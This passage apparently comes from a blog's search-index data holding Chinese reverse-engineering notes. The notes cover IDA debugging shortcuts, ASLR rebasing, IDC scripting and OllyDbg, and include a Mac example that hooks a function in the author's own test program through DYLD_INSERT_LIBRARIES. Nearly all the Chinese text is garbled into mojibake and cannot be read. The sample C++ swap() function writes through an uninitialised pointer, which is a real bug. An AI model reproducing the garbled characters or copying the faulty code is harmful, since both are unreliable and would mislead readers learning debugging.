(æ³¨é‡Šä¼šåœ¨è°ƒç”¨/å¼•ç”¨ä½ç½®åŒæ­¥æ˜¾ç¤º) : (å†’å·) + shift + ; (åˆ†å·) å†™æ³¨é‡Š (æ³¨é‡Šåªä¼šåœ¨å†™çš„ä½ç½®æ˜¾ç¤º) X æŸ¥çœ‹å¼•ç”¨, å¯¹ç€æŸä¸ªå‡½æ•°ã€å˜é‡æŒ‰è¯¥å¿«æ·é”®ï¼Œå¯ä»¥æŸ¥çœ‹å®ƒçš„äº¤å‰å¼•ç”¨ y æ›´æ”¹å˜é‡çš„ç±»å‹ F2 åœ¨æ‰€åœ¨è¡Œä¸‹æ–­ç‚¹ F5 å¿«é€Ÿåæ±‡ç¼–ï¼Œå°†æ–‡ä»¶æ±‡ç¼–è¯­è¨€è½¬æ¢æˆä¼ªä»£ç ï¼Œä¾¿äºä½¿ç”¨è€…å¯¹å…¶è¿›è¡Œåˆ†æã€‚ å¯ä»¥å°†ARMæŒ‡ä»¤è½¬åŒ–ä¸ºå¯è¯»çš„Cä»£ç ï¼ŒåŒæ—¶å¯ä»¥ä½¿ç”¨Yé”®ï¼Œå¯¹JNIEnvæŒ‡é’ˆåšä¸€ä¸ªç±»å‹è½¬æ¢ï¼Œä»è€Œå¯¹JNIé‡Œç»å¸¸ä½¿ç”¨çš„JNIEnvæ–¹æ³•èƒ½å¤Ÿè¯†åˆ« æ¯”å¦‚å¿«é€Ÿè½¬æ¢ä¸ºC å°½é‡ä¸ç”¨, å› ä¸ºä¸ä¼šå¾ˆå‡†ç¡®, è¯†åˆ«ä¸äº†çš„åœ°æ–¹ä¼šçœç•¥, ä¸”æ²¡æœ‰ç›´æ¥çœ‹æ±‡ç¼–ä»£ç æ¸…æ™° F7 å•æ­¥æ­¥è¿›, å•æ­¥è¿›å…¥è°ƒè¯• F8 å•æ­¥æ­¥è¿‡, æŒ‰ç…§é¡ºåºä¸€è¡Œä¸€è¡Œï¼Œå•æ­¥è°ƒè¯• F9 ç»§ç»­è¿è¡Œç¨‹åº, ç›´æ¥è·³åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹å¤„ F4 è¿è¡Œåˆ°å…‰æ ‡æ‰€åœ¨è¡Œ Ctrl + F7 ç›´åˆ°è¯¥å‡½æ•°è¿”å›æ—¶æ‰åœæ­¢ Ctrl + F2 ç»ˆæ­¢ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ Shift + F12 æŸ¥çœ‹String, å¿«é€ŸæŸ¥çœ‹soæ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²ä¿¡æ¯ï¼Œåˆ†æè¿‡ç¨‹ä¸­é€šè¿‡ä¸€äº›å…³é”®å­—ç¬¦ä¸²èƒ½å¤Ÿè¿…é€Ÿå®šä½åˆ°å…³é”®å‡½æ•° Ctrl + s æœ‰ä¸¤ä¸ªç”¨é€”ï¼Œ åœ¨IDA Viewé¡µé¢ä¸­å¯ä»¥æŸ¥çœ‹æ–‡ä»¶soæ–‡ä»¶çš„æ‰€æœ‰æ®µä¿¡æ¯ åœ¨è°ƒè¯•é¡µé¢å¯ä»¥æŸ¥çœ‹ç¨‹åºä¸­æ‰€æœ‰soæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜çš„åŸºåœ°å€ æ³¨è§£ tips: åœ¨è¿›è¡Œsoè°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œå¾ˆæœ‰ç”¨çš„ä¸€ä¸ªå°æŠ€å·§å°±æ˜¯IDAåŒå¼€ï¼Œ ä¸€ä¸ªç”¨äºè¿›è¡Œé™æ€åˆ†æï¼›ä¸€ä¸ªç”¨äºåŠ¨æ€è°ƒè¯•ã€‚æ¯”å¦‚è¯´è°ƒè¯•è¿‡ç¨‹ä¸­è¦æ‰¾åˆ°ä¸€ä¸ªå‡½æ•°çš„åŠ è½½åˆ°å†…å­˜ä¸­çš„ä½ç½®ï¼Œ IDAéƒ¨åˆ†å‰ç¼€å«ä¹‰ sub_ æŒ‡ä»¤å’Œå­å‡½æ•°èµ·ç‚¹ locret_ è¿”å›æŒ‡ä»¤ loc_ æŒ‡ä»¤ off_ æ•°æ®ï¼ŒåŒ…å«åç§»é‡ seg_ æ•°æ®ï¼ŒåŒ…å«æ®µåœ°å€å€¼ asc_ æ•°æ®ï¼ŒASCIIå­—ç¬¦ä¸² byte_ æ•°æ®ï¼Œå­—èŠ‚ï¼ˆæˆ–å­—èŠ‚æ•°ç»„ï¼‰ word_ æ•°æ®ï¼Œ16ä½æ•°æ®ï¼ˆæˆ–å­—æ•°ç»„ï¼‰ dword_ æ•°æ®ï¼Œ32ä½æ•°æ®ï¼ˆæˆ–åŒå­—æ•°ç»„ï¼‰ qword_ æ•°æ®ï¼Œ64ä½æ•°æ®ï¼ˆæˆ–4å­—æ•°ç»„ï¼‰ flt_ æµ®ç‚¹æ•°æ®ï¼Œ32ä½ï¼ˆæˆ–æµ®ç‚¹æ•°ç»„ï¼‰ dbl_ æµ®ç‚¹æ•°ï¼Œ64ä½ï¼ˆæˆ–åŒç²¾åº¦æ•°ç»„ï¼‰ tbyte_ æµ®ç‚¹æ•°ï¼Œ80ä½ï¼ˆæˆ–æ‰©å±•ç²¾åº¦æµ®ç‚¹æ•°ï¼‰ stru_ ç»“æ„ä½“(æˆ–ç»“æ„ä½“æ•°ç»„) algn_ å¯¹é½æŒ‡ç¤º unk_ æœªå¤„ç†å­—èŠ‚ ç¨‹åºåŸºå€(Rebase Program) æ³¨è§£ æœ‰çš„åœ°æ–¹è¯´æ³•æ˜¯: ç›®æ ‡å‡½æ•°å®é™…åœ°å€=å‡½æ•°åç§»+soåŸºå€+1ï¼Œ +1æ˜¯å› ä¸ºè¦æ ‡è¯†armå’ŒthumbæŒ‡ä»¤åŒºåˆ«ï¼› è®¡ç®—: åç§»åæ¨¡å—åŸºåœ°å€ = åç§»å‰æ¨¡å—åŸºåœ°å€ + ASLRåç§» æ¯æ¬¡ä¸‹æ–­ç‚¹çš„æ—¶å€™ï¼Œéƒ½æ˜¯é€šè¿‡å…ˆæ‰‹å·¥åœ¨IDAé‡ŒæŸ¥çœ‹çš„åç§»å‰æ¨¡å—åŸºåœ°å€ï¼Œå†æ‰‹å·¥åœ¨LLDBé‡ŒæŸ¥çœ‹ASLRåç§»ï¼Œæœ€åæ‰‹å·¥åœ¨è®¡ç®—å™¨é‡Œå°†ä¸¤è€…ç›¸åŠ çš„æ–¹å¼æ¥è®¡ç®—åç§»åæ¨¡å—åŸºåœ°å€çš„ï¼Œè™½ç„¶ç»“æœå¯ä»¥ä¿è¯100%æ­£ç¡®ï¼Œä½†æ“ä½œæµç¨‹ç¨æœ‰äº›å¤æ‚ å¦‚ä½•æ‰èƒ½åªæ‰‹å·¥æ“ä½œä¸€æ¬¡ï¼Œå°±å¯ä»¥æå®šæ‰€æœ‰æ–­ç‚¹çš„åœ°å€ã€‚é‚£å°±æ˜¯è®©IDAç›´æ¥æ˜¾ç¤ºè®¡ç®—å¥½çš„åç§»åæ¨¡å—åŸºåœ°å€? é¦–å…ˆåœ¨LLDBé‡ŒæŸ¥çœ‹å¾…åˆ†ææ¨¡å—çš„ASLRåç§»: (lldb) image list -o -f [ 0] 0x00000000000a0000 /var/containers/Bundle/Application/046BD91B-E9FB-4C77-8EC3-908237232716/TargetApp.app/TargetApp(0x00000001000a0000) ... è¿™é‡ŒASLRåç§»æ˜¯ 0x00000000000a0000 ã€‚ ç„¶åæ‰“å¼€IDAè®¾ç½®rebase program: é¦–å…ˆå°†é¼ æ ‡å…‰æ ‡ç‚¹å‡»åˆ°IDAå³è¾¹çš„ç•Œé¢ï¼Œè¿™æ ·æ‰ä¼šæœ‰æˆ‘ä»¬éœ€è¦è®¾ç½®çš„é€‰é¡¹ã€‚ åœ¨èœå•ä¸Šçš„\"Edit\"ã€\"Segments\"ã€\"Rebase program...\"é‡Œå°†\"Value\"çš„å€¼åŠ ä¸ŠTargetAppçš„ASLRåç§»ï¼Œ å¯ä»¥çœ‹åˆ°èµ·å§‹çš„åœ°å€æ˜¯0x100000000, åŠ ä¸ŠASLRåç§»åœ°å€: å‚è€ƒ: IDAè°ƒè¯•æŠ€å·§ï¼ˆå¦¥å¦¥çš„å¹²è´§åˆ†äº«ï¼‰ IDAè®¾ç½®æ¡ä»¶è®°å½•æ–­ç‚¹ å‚è€ƒ: idaè®¾ç½®æ¡ä»¶è®°å½•æ–­ç‚¹ æ›´è¯¦ç»†çš„: IDAæ–­ç‚¹å’Œæœç´¢ è®¾ç½®å†…å­˜æ–­ç‚¹ å†…å­˜æ–­ç‚¹å±äºç¡¬ä»¶æ–­ç‚¹, è€Œä¸Šé¢çš„æ¡ä»¶è®°å½•çš„ä»£ç æ–­ç‚¹å¼è½¯ä»¶æ–­ç‚¹ å†…å­˜æ–­ç‚¹éœ€è¦æå‰é…ç½®æ•°æ®å—ä¿¡æ¯ æµç¨‹: åœ¨ä»£ç åŒºï¼Œgåˆ°æ‰¾åˆ°çš„æ•°æ®å—åœ°å€ã€‚ åœ¨æ•°æ®å—é¦–åœ°å€æŒ‰ä¸‹F2,è®¾ç½®æ–­ç‚¹ã€‚ å› ä¸ºè¿™ä¸ªæ–­ç‚¹æ‰€åœ¨ä½ç½®ä¸æ˜¯ä»£ç å—ï¼ŒIDAä¼šå¼¹å‡ºè®¾ç½®å¯¹è¯æ¡†ã€‚å¯ä»¥åœ¨é‡Œé¢å¡«æ•°æ®å—é•¿åº¦ã€‚ éå¿…é¡»ï¼Œå»çœ‹çœ‹æ–­ç‚¹åˆ—è¡¨ï¼Œçœ‹çœ‹å†…å­˜æ–­ç‚¹å’Œæ‰§è¡Œæ–­ç”µçš„åŒºåˆ«ã€‚ å†…å­˜è®¿é—®æ–­ç‚¹å’Œæ‰§è¡Œæ–­ç‚¹çš„åŒºåˆ« å¯ä»¥çœ‹åˆ°ï¼š æ‰§è¡Œæ–­ç‚¹æ˜¯è½¯ä»¶æ–­ç‚¹ã€‚ å†…å­˜è®¿é—®æ–­ç‚¹æ˜¯ç¡¬ä»¶æ–­ç‚¹ã€‚ å‚è€ƒ: IDAåŠ¨æ€è°ƒè¯•---è®¾ç½®å†…å­˜æ–­ç‚¹ï¼ˆåŠè½¬è½½ï¼‰ è¿œç¨‹è°ƒè¯• idaæ”¯æŒè¿œç¨‹è°ƒè¯•Windowsã€linuxã€Androidã€Mac OSçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œ å°†æ–‡ä»¶æ”¾åœ¨è¿œç¨‹çš„å¯¹åº”ç³»ç»ŸæœåŠ¡å™¨ä¸Šï¼Œidaè¿œç¨‹è¿æ¥æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œã€è°ƒè¯•ç¨‹åºï¼Œ å¹¶åœ¨æœ¬åœ°å®¢æˆ·ç«¯æ˜¾ç¤ºè°ƒè¯•ç•Œé¢ã€‚ç•Œé¢è§†å›¾ä¸Šå’Œæœ¬åœ°è°ƒè¯•å¹¶æ²¡æœ‰åŒºåˆ«ã€‚ å¦‚æœéœ€è¦è¿œç¨‹è°ƒè¯•ï¼Œé¦–å…ˆéœ€è¦å°†idaçš„æœåŠ¡ç«¯éƒ¨ç½²åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œidaçš„æœåŠ¡ç«¯å­˜å‚¨åœ¨idaç›®å½•ä¸­çš„dbgsrvæ–‡ä»¶ä¸­ å°†éœ€è¦è°ƒè¯•çš„æ–‡ä»¶å’ŒæœåŠ¡ç«¯ç‰ˆæœ¬æ”¾å…¥æœåŠ¡å™¨ä¸­ï¼Œç„¶åè¿è¡ŒæœåŠ¡ç«¯ï¼Œä¼šé»˜è®¤åœ¨23946ç«¯å£å¯åŠ¨idaæœåŠ¡ç«¯ç¨‹åºï¼Œä»¥linuxä¸ºä¾‹ è¢«è°ƒè¯•ç¨‹åºæ˜¯64ä½elfæ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨linuxç«¯è¿è¡Œlinux_server64ï¼Œç„¶åå›åˆ°å®¢æˆ·ç«¯ å®¢æˆ·ç«¯çš„ç¬¬ä¸€æ­¥æ²¡ä»€ä¹ˆå˜åŒ–ï¼Œåœ¨èœå•é€‰æ‹©debuggeræ ï¼Œåœ¨é€‰æ‹©debuggeræ—¶ï¼Œé€‰æ‹©Remote Linux debugger å‚è€ƒ: idaä½¿ç”¨æŠ€å·§ä¹‹åŠ¨æ€è°ƒè¯• è™šæ‹Ÿå†…å­˜ç©ºé—´åœ°å€è¡¨ é«˜2Gç©ºé—´ ï¼ˆRing0çº§èƒ½è®¿é—®åŒºåŸŸï¼‰ 0xFFFFFFFF-0xC0000000ï¼š1GBç”¨äºVxDã€å­˜å‚¨å™¨ç®¡ç†å’Œæ–‡ä»¶ç³»ç»Ÿï¼› 0xBFFFFFFF-0x80000000ï¼š1GBå…±äº«çš„WIN32 DLLã€å­˜å‚¨å™¨æ˜ å°„æ–‡ä»¶å’Œå…±äº«å­˜å‚¨åŒºï¼› ä½2Gç©ºé—´ï¼ˆRing3æƒé™åŒºåŸŸï¼‰: 0x7FFFFFFF-0x00400000ï¼šçº¦2GBä¸ºæ¯ä¸ªè¿›ç¨‹çš„WIN32ä¸“ç”¨åœ°å€ï¼› 0x003FFFFF-0x00001000ï¼šä¸ºMS-DOSç³»ç»Ÿ å’Œ WIN16åº”ç”¨ç¨‹åºï¼› 0x00000FFF-0x00000000ï¼šä¸ºé˜²æ­¢ä½¿ç”¨ç©ºæŒ‡é’ˆçš„4,096å­—èŠ‚ï¼› åŒæ—¶é¡ºä¾¿æé†’ä¸€ä¸‹ï¼Œä¸ç®¡EXEæˆ–DLLåŸºå€éƒ½æ˜¯å¯å˜çš„ï¼Œä½†ä¸€ä¸ªDLLåŠ è½½åˆ°EXEåï¼ŒåŸºå€ä¼šè¢«é‡å®šå‘ï¼Œä½†åç§»åœ°å€æ˜¯ä¸å˜çš„ï¼› äºPEæ–‡ä»¶ï¼ŒPEå¤´çš„é•¿åº¦å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œå½“ç„¶æœ‰ç€åŒæ ·çš„è§£ææ ‡å‡†ï¼Œå¯ä¹Ÿå¯¼è‡´IDAä¸­åç§»åœ°å€-åŸºå€ä¸ä¸€å®šç­‰äºæ–‡ä»¶åœ°å€ï¼Œ åˆ¤æ–­ä»£ç åœ¨æ–‡ä»¶ä¸­çš„åŸºå€å¾ˆå®¹æ˜“ï¼Œé€šå¸¸PEå¤´åœ¨WinHexä¸­å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°\"This program cannot be run in DOS.....\"ï¼Œ ä¹‹åå°±æ˜¯ä¸€äº›æ®µåç§°ï¼šå¦‚.textï¼Œ.rdataã€‚æ¥ç€å°±æ˜¯ä¸€å°æ®µ00ï¼Œä¹‹åå‡ºç°æ•°æ®çš„åœ°æ–¹å°±æ˜¯ä»£ç åŸºå€ï¼Œå¤§éƒ¨åˆ†æ˜¯55 8Bæˆ–56 8Bç­‰ã€‚ å‚è€ƒ(è¿˜æœ‰è·å–åç§»åœ°å€è¯´æ˜): é€†å‘ä¸­é™æ€åˆ†æå·¥å…·â€”â€”IDAåˆå­¦è€…ç¬”è®° å¾…çœ‹ å‚è€ƒè¿™ä½¿ç”¨ï¼š IDA proä¸x64dbgåœ°å€å¯¹é½ IDCè„šæœ¬/æŒ‡ä»¤ å°±æ˜¯ç•Œé¢å·¦ä¸‹è§’çš„é‚£ä¸ª DCæ˜¯idaä¸­æ”¯æŒçš„ä¸€é—¨ä¸Cè¯­è¨€ç±»ä¼¼çš„è¯­è¨€ï¼Œä½†æ˜¯å®ƒæ˜¯è§£é‡Šå‹çš„ï¼Œ å¹¶ä¸æ˜¯ç¼–è¯‘å‹çš„ï¼Œäºæ­¤åŒæ—¶IDCè¿˜èåˆäº†ä¸€äº›pythonä¸­çš„å…ƒç´ ä»¥æ–¹ä¾¿ä¸€äº›å†…å®¹çš„å¤„ç†ã€‚ æ‰§è¡ŒIDCè„šæœ¬ä¸€å…±æœ‰ä¸‰ç§æ–¹å¼: idcå‘½ä»¤è¡Œï¼ˆèœå•æ file->idc commandï¼‰ è„šæœ¬æ–‡ä»¶ (èœå•æ file->script file) pythonå‘½ä»¤è¡Œï¼ˆèœå•æ file->python commandï¼‰ æ³¨é‡Š idcä¸­ä½¿ç”¨C++é£æ ¼çš„ // è¿›è¡Œå•è¡Œæ³¨é‡Šï¼› é‡‡ç”¨cé£æ ¼çš„ /* */ è¿›è¡Œå¤šè¡Œæ³¨é‡Šã€‚ å¸®åŠ©ç³»ç»Ÿ idaä¸ºç”¨æˆ·æä¾›äº†ä¸€ä¸ªå¾ˆå®Œå¤‡çš„å¸®åŠ©ç³»ç»Ÿï¼Œå¯ä»¥ä½¿ç”¨F1å¿«æ·é”®æ‰“å¼€å¸®åŠ©ç³»ç»Ÿï¼Œ å…¶ä¸­ç‚¹å‡»\"index of idc functions\"å¯ä»¥çœ‹åˆ°å¯¹åº”ä¸€äº›idcçš„å‡½æ•°åˆ—è¡¨ã€‚ idcå˜é‡ idcåœ¨ä¸€ä¸ªè¯­å¥ä¸­å¯ä»¥ç”Ÿå‘½å¤šä¸ªå˜é‡ï¼Œä½†æ˜¯idcä¸æ”¯æŒcè¯­è¨€é£æ ¼çš„æ•°ç»„ã€æŒ‡é’ˆã€ç»“æ„ä½“ã€è”åˆç­‰å¤æ‚çš„æ•°æ®ç»“æ„ã€‚ idcæ˜¯ä¸€ç§æ¾æ•£çš„è¯­è¨€ï¼Œå˜é‡æ²¡æœ‰æ˜ç¡®çš„ç±»å‹ï¼Œå…¶ä¸»è¦ä½¿ç”¨ä¸‰ç§æ•°æ®ç±»å‹ï¼šæ•´å½¢ï¼ˆlongï¼‰ã€å­—ç¬¦ä¸²å‹ã€æµ®ç‚¹å€¼ã€‚ æ”¯æŒå…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡ å±€éƒ¨å˜é‡(auto): auto add,reg,val; //å¤šä¸ªå˜é‡åŒæ—¶å£°æ˜ï¼Œæœªåˆå§‹åŒ– auto valinit=0; //å£°æ˜åŒæ—¶åˆå§‹åŒ– å…¨å±€å˜é‡(extern): extern outval; extern illeval=\"wrong\" //éæ³•å®šä¹‰ï¼Œå£°æ˜å…¨å±€å˜é‡æ—¶ä¸èƒ½è¿›è¡Œåˆå§‹åŒ– static main(){ extern insideval; outval=\"global string\" //ä¸ºå…¨å±€å˜é‡èµ‹å€¼ insideval=1; } idcå‡½æ•° idcä¸­ä¹Ÿå¯ä»¥è‡ªå®šä¹‰å‡½æ•°ï¼Œå…¶å£°æ˜æ–¹å¼ä¸º: static func(arg1,arg2,arg3) { statements ... } ç”¨æˆ·å®šä¹‰å‡½æ•°ä¸éœ€è¦è¿›è¡ŒæŒ‡å®šç‰¹å®šçš„å‚æ•°ç±»å‹ï¼Œå› ä¸ºåœ¨éœ€è¦çš„æ—¶å€™ç¨‹åºä¼šè‡ªåŠ¨è¿›è¡Œè½¬åŒ–ã€‚ å¦‚æœéœ€è¦å‡½æ•°è¿”å›æŒ‡å®šçš„å€¼éœ€è¦ä½¿ç”¨returnè¿›è¡ŒæŒ‡å®šï¼Œå¦åˆ™é»˜è®¤ä¸æ˜¾ç¤ºè¿”å›ä¸€ä¸ªå€¼çš„å‡½æ•°éƒ½å°†è¿”å›é›¶å€¼ã€‚ idcè¯­å¥ idcä¸­æ”¯æŒCä¸­çš„è¯­å¥ï¼Œé™¤äº†switchã€‚ idcè¡¨è¾¾å¼ idcå‡ ä¹éƒ½èƒ½æ”¯æŒCè¯­è¨€ä¸­çš„æ“ä½œè¿ç®—è¡¨è¾¾ï¼ˆåŠ å‡ä¹˜é™¤ã€åˆ¤ç­‰å®¶æ—ï¼‰ï¼Œä½†æ˜¯æ˜ç¡®è¯´æ˜ä¸æ”¯æŒ+=ã€‚ idcé¢„å®šä¹‰ç¬¦å· idcæœ‰ä¸€äº›ç¬¦å·æ˜¯æå‰å®šä¹‰å¥½äº†çš„ï¼Œå…¶å†…å®¹å’Œå«ä¹‰å¦‚ä¸‹: _NT_ IDA is running under MS Windows _LINUX_ IDA is running under Linux _MAC_ IDA is running under Mac OS X _UNIX_ IDA is running under Unix (linux or mac) _EA64_ 64-bit version IDA _QT_ GUI version of IDA (Qt) _GUI GUI version of IDA _TXT_ Text version of IDA _IDA_VERSION_ The current IDA version. For example: \"7.5\" _IDAVER_ The current, numerical IDA version. For example: \"750\" means v7.5 idcå­—ç¬¦ä¸²æ“ä½œï¼ˆåˆ‡ç‰‡ï¼‰ idcä¸­å¯¹äºå­—ç¬¦ä¸²çš„æ“ä½œåº”è¯¥æ˜¯å€Ÿé‰´äº†pythonï¼Œå…¶stringç±»å‹çš„æ“ä½œæ”¯æŒåˆ‡ç‰‡æ“ä½œï¼ˆslicesï¼‰ idcå¼‚å¸¸å¤„ç† idcå¼‚å¸¸å¤„ç†ä¸­ï¼Œå¯ä»¥ä½¿ç”¨çš„è¡¨è¾¾è¯­å¥: auto e; try { ... some statements that cause a runtime error... } catch ( e ) { // e holds the exception information // it is an instance of the exception class } throw xx; #æŠ›å‡º idcç¨‹åº å¦‚æœåªæ˜¯éœ€è¦è¿›è¡Œç®€å•çš„æŸ¥è¯¢æˆ–è€…æŸ¥çœ‹ï¼Œå¯ä»¥ç›´æ¥ç¼–å†™ä¸ªåˆ«è¡Œçš„å‡½æ•°å®Œæˆç¼–å†™ï¼Œ ä½†æ˜¯å¦‚æœä¸€ä¸ªè„šæœ¬åº”ç”¨éœ€è¦æ‰§è¡Œå¤§é‡çš„IDCç¨‹åºï¼Œå¹¶ä¸”è¿˜å¯èƒ½ä¼šåœ¨å¾ˆå¤šåœºæ™¯ä¸‹éœ€è¦é‡å¤ä½¿ç”¨ï¼Œ é‚£ä¹ˆæˆ‘ä»¬å¯èƒ½éœ€è¦åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„IDCç¨‹åºæ–‡ä»¶ã€‚ IDCç¨‹åºæ–‡ä»¶è¦æ±‚ç”¨æˆ·ä½¿ç”¨ç”¨æˆ·å®šä¹‰çš„å‡½æ•°ï¼Œå¹¶ä¸”è‡³å°‘å®šä¹‰ä¸€ä¸ªæ²¡æœ‰å‚æ•°çš„mainå‡½æ•°ï¼Œ æ­¤å¤–ä¸»ç¨‹åºæ–‡ä»¶ä¸­å¿…é¡»åŒ…å«idc.idcå¤´æ–‡ä»¶: #idcç¨‹åºæ–‡ä»¶åŸºæœ¬ç»“æ„ #Include <idc.idc> static main(){ Message(\"this is a IDC scipt file\"); } IDCæ”¯æŒå¦‚ä¸‹Cé¢„å¤„ç†æŒ‡ä»¤: #include <æ–‡ä»¶> ï¼›å°†æŒ‡å®šçš„æ–‡ä»¶åŒ…å«åœ¨å½“å‰æ–‡ä»¶ä¸­ #define <å®åç§°>[å¯é€‰é¡¹] ï¼›åˆ›å»ºå®ï¼Œå¯ä»¥é€‰æ‹©ç»™å®åˆ†é…æŒ‡å®šçš„å€¼ #ifdef <åç§°>; æµ‹è¯•æŒ‡å®šçš„å®æ˜¯å¦å­˜åœ¨ #else ä¸ifdefä¸€èµ·ä½¿ç”¨ #endif é€šè¿‡ifdefæŒ‡å®šå®šä¹‰ç»ˆæ­¢ç¬¦ #undef <åç§°> ï¼›åˆ é™¤æŒ‡å®šçš„å® å‚è€ƒ: ida-IDCè„šæœ¬å‰–æ ä¸€æ–‡è§£å†³IDAçš„IDCè„šæœ¬è¯­è¨€å…¥é—¨æ•™ç¨‹ https://ybrc.github.io/zh-cn/14-2/ 3.1 IDA Proç¼–å†™IDCè„šæœ¬å…¥é—¨ IDA ä¸­çš„IDCè„šæœ¬ç¼–å†™ç¬”è®° è°ƒè¯•å®æ“ ä½¿ç”¨IDAè¿›è¡ŒåŠ¨æ€è°ƒè¯•ä¸è¿‡åè°ƒè¯•","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA.html"},{"title":"IDA-Pro","text":"å®˜ç½‘: https://hex-rays.com/IDA-pro/ è¿™ä¸ªåˆ†å…è´¹ç‰ˆä»˜è´¹ç‰ˆ, å…è´¹çš„å¥½åƒå°±æ˜¯æ™®é€šçš„IDA","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA-PRO.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA-PRO.html"},{"title":"IDA-é—®é¢˜æ€»ç»“","text":"Macä¸‹è°ƒè¯•éœ€è¦æƒé™ Macä¸‹ä¸€èˆ¬ä½¿ç”¨é»˜è®¤çš„æœ¬åœ°è°ƒè¯•å™¨, ç”±äºæƒé™é—®é¢˜æ— æ³•å¯åŠ¨ å®˜æ–¹å»ºè®®çš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨ è¿œç¨‹è°ƒè¯• å°±æ˜¯å¯åŠ¨: /Applications/IDA\\ Pro\\ 7.5/idabin/dbgsrv/mac_server64 ååœ¨IDA Proä¸­é€‰æ‹© Remote Mac OS X debugger å‚è€ƒ: https://hex-rays.com/wp-content/static/tutorials/mac_debugger_primer2/mac_debugger_primer2.html ä½†æ˜¯è¿™ä¸ªè¦æ±‚IDA Pro, ä¸ªäººå…è´¹ç‰ˆä¸æ”¯æŒremote debug...","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA-Question-Summary.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA-Question-Summary.html"},{"title":"OllyDbg (OD)","text":"ä¹Ÿç®€ç§°OD, æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€çš„32ä½è°ƒè¯•å™¨å·¥å…·, åªæœ‰Windowsç‰ˆæœ¬ çœ‹æœ€åä¸€æ¬¡æ›´æ–°æ˜¯2014å¹´äº†, æˆ‘éƒ½è¿˜æ²¡é«˜è€ƒ å®˜ç½‘: http://www.ollydbg.de/ ä¸­æ–‡ç«™: http://www.ollydbg.org/ æ‘˜è‡ªä¸­æ–‡ç«™çš„ä»‹ç»: OllyDbgæ˜¯ä¸€ç§å…·æœ‰å¯è§†åŒ–ç•Œé¢çš„32ä½æ±‡ç¼–åˆ†æè°ƒè¯•å™¨ï¼Œæ˜¯ä¸€ä¸ªæ–°çš„åŠ¨æ€è¿½è¸ªå·¥å…·ï¼Œ å°†IDAä¸SoftICEç»“åˆèµ·æ¥çš„æ€æƒ³ï¼ŒRing3çº§è°ƒè¯•å™¨ï¼Œéå¸¸å®¹æ˜“ä¸Šæ‰‹ï¼Œ å·±ä»£æ›¿SoftICEæˆä¸ºå½“ä»Šæœ€ä¸ºæµè¡Œçš„è°ƒè¯•è§£å¯†å·¥å…·äº†ã€‚åŒæ—¶è¿˜æ”¯æŒæ’ä»¶æ‰©å±•åŠŸèƒ½ï¼Œæ˜¯ç›®å‰æœ€å¼ºå¤§çš„è°ƒè¯•å·¥å…·ã€‚ ç®€å•ä»‹ç»å¯å‚è€ƒ: https://zhuanlan.zhihu.com/p/95151936 ä½¿ç”¨å¯å‚è€ƒ: https://blog.csdn.net/freeking101/article/details/101180621 æ±‰åŒ–: https://developer.aliyun.com/article/865381 (æ²¡çœ‹ä¸Šé¢ä¸­æ–‡ç«™æ˜¯ä¸æ˜¯æœ‰)","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-Ollydbg.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-Ollydbg.html"},{"title":"å®æˆ˜-Macä¸‹Hookå…¶ä»–è¿›ç¨‹","text":"å†™ä¸€ä¸ªæµ‹è¯•çš„æºç test2.cpp: #include \"stdio.h\" int add(int a, int b){ int tmp = a + 3; return tmp + b; } extern \"C\"{ int add2(int a, int b){ return a+b+10;} } int sub(int a, int b){ return a-b; } void swap(int *a, int *b){ int *tmp; *tmp = *a; *a = *b; *b = *tmp; } int main(){ int a = 10000; int b = 10090; int c = 10000; int d = 10000; int e[] = {10000, 10000, 5, 80}; int f[] = {10000, 5, 10000, 80}; int retAdd = add(a, b); printf(\"a + b + éšæœºå€¼= %d + %d + 3 = %d\\n\", a, b, retAdd); printf(\"äº¤æ¢a, bçš„å€¼, äº¤æ¢å‰: a: %d; b: %d\\n\", a, b); swap(&a, &b); printf(\"äº¤æ¢a, bçš„å€¼, äº¤æ¢å: a: %d; b: %d \\n\", a, b); // fflush(); return 0; } å°†å…¶ç¼–è¯‘ä¸ºæ‰§è¡Œæ–‡ä»¶test2: // g++ -std=c++11 -dynamiclib -g -o libtest2.dylib test2.cpp // g++ -std=c++11 -g -l test2preutil -L /Users/yanque/project/code/TryTest -o test2 test2.cpp /usr/bin/clang++ -std=gnu++14 -fcolor-diagnostics -fansi-escape-codes -g test2.cpp -o test2 ç¼–ç é’©å­test2-hook-add-func.cpp: #include \"stdio.h\" #include <dlfcn.h> #include <stdio.h> #include <stdlib.h> // å®šä¹‰åŸå§‹å‡½æ•°æŒ‡é’ˆç±»å‹ typedef int (*OrigAddFunc)(int a, int b); int add(int a, int b) { OrigAddFunc orig_add = NULL; orig_add = (OrigAddFunc)dlsym(RTLD_NEXT,\"_Z3addii\"); int tmp = orig_add(a, b); fprintf(stderr, \"hook add; a + b = %d + %d = %d\", a, b, tmp); fprintf(stderr, \"%s %d %d\\n\", __FILE__, __LINE__, tmp); return tmp; } ç¼–è¯‘ä¸ºåŠ¨æ€åº“ libtest2hook.dylib : g++ -std=c++11 -dynamiclib -o libtest2hook.dylib test2-hook-add-func.cpp å› ä¸ºæ˜¯Macç³»ç»Ÿ: DYLD_INSERT_LIBRARIES=`pwd`/libtest2hook.dylib ./test2 